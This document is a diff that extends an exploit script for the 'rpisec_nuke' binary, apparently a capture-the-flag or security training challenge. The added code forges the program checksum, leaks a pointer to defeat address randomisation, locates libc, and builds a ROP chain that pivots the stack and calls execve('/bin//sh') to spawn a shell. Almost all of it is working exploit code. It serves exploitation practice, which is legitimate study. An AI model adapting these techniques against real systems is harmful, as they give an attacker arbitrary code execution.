@@ -6,7 +6,7 @@ from pwn import *
 import mycrypto
 
 
-p = process(["./rpisec_nuke"], env={"LD_PRELOAD": "./usleep.so"})
+p = process(["./rpisec_nuke"], env={"LD_PRELOAD": "./usleep.so ./libc.so.6"})
 log.info(util.proc.pidof(p))
 
 # Get session ID (e.g. buf)
@@ -132,4 +132,124 @@ p.recvuntil("KEY AUTHENTICATED")
 log.info("Done key 1")
 p.sendline("")
 
+# Time for Warhead
+p.sendlineafter("MENU SELECTION:", "4")
+
+def fix_program(program):
+    target_checksum = 0xDCDC59A9
+    # Pad
+    program += "\x00" * (4 - len(program) % 4)
+    # Adjust the checksum
+    checksum = 0
+    for i in range(0, len(program), 4):
+        val = u32(program[i:i+4])
+        checksum ^= val
+
+    # Account for the "\x00END" that is added and the desired checksum
+    adjust = checksum ^ target_checksum ^ u32("\x00END")
+    program += p32(adjust)
+    return program
+
+def send_program(program):
+    p.sendlineafter("AS HEX STRING:", program.encode("hex"))
+    p.sendlineafter("PRESS ENTER", "")
+    p.sendlineafter("TYPE CONFIRM", "confirm")
+
+def send_payload(payload):
+    program = fix_program(payload)
+    send_program(program)
+
+# First leak out the function pointers
+payload = ""
+# -- Advance to the disarm pointer
+payload += "I" * 128
+# -- Read out each byte
+payload += "OI" * 4
+# -- Reprogram
+payload += "R"
+
+send_payload(payload)
+
+# Read out each byte
+addr = ""
+for i in range(4):
+    p.recvuntil("0x")
+    b = p.recv(2).decode("hex")
+    addr += b
+addr = u32(addr)
+
+log.info("Got disarm pointer {:#x}".format(addr))
+
+# Rebase elf
+elf = ELF("./rpisec_nuke")
+elf.address = addr - elf.symbols["disarm_nuke"]
+log.info("Got image base {:#x}".format(elf.address))
+
+def write_bytes_program(buf):
+    program = []
+    for b in buf:
+        program.append("S{}I".format(b))
+
+    return "".join(program)
+
+LIBC_OFFSET = 0x3727632e
+SYSTEM_OFFSET = 0x3ada0  # On my Ubuntu 16.04 64 bit
+EXIT_OFFSET = 0x2e9d0
+libc_addr = elf.address + LIBC_OFFSET
+# Because I don't have a trusty VM (where libc to PIE bin offset is constant) I'm going to cheat
+with open("/proc/{}/maps".format(util.proc.pidof(p)[0]), "r") as f:
+    for line in f:
+        if "libc" in line:
+            libc_addr = int(line.split("-")[0], 16)
+            break
+log.info("Libc must be at {:#x}".format(libc_addr))
+
+# Overwrite the detonate pointer with a pointer to a pivot to a ROP chain
+payload = ""
+key4_addr = buf_addr + 0x1320
+log.info("Key4 buffer is at {:#x}".format(key4_addr))
+
+# Gadgets
+# -- From bin
+mov_esp_edx = 0x2cd4  # Pivot
+# -- From libc
+pop_ebx = 0x000198ce  # pop ebx ; ret
+pop_ecx_eax = 0x000ef750  # pop ecx ; pop eax ; ret
+pop_edx = 0x00001aa2  # pop edx ; ret
+binsh_addr = libc_addr + 0x160a24
+syscall = 0x0002e6a5  # int 0x80
+
+rop = ""
+rop += p32(libc_addr + pop_ecx_eax)
+rop += p32(0)
+rop += p32(0xb)  # execve
+rop += p32(libc_addr + pop_ebx)
+rop += p32(binsh_addr)
+rop += p32(libc_addr + pop_edx)
+rop += p32(0)
+rop += p32(libc_addr + syscall)
+
+# Desired state:
+# $eax   : 0x0000000b
+# $ebx   : 0xffffd550  >  "/bin//sh"
+# $ecx   : 0xffffd548  >  0xffffd550  >  "/bin//sh"
+# $edx   : 0xffffd5a4  >  0x00
+
+payload += write_bytes_program(rop)
+
+# We want to overwrite the pointers
+# -- Advance past the end of program, past disarm_ptr to detonate_ptr
+payload += "I" * (132 - len(rop))
+# -- Write the pivot gadget over the function pointer
+payload += write_bytes_program(p32(elf.address + mov_esp_edx))
+
+# Detonate
+payload += "DOOM"
+
+payload = fix_program(payload)
+
+pause()
+# Fix to pass checksum
+program = fix_program(payload)
+p.sendlineafter("AS HEX STRING:", program.encode("hex"))
 p.interactive()
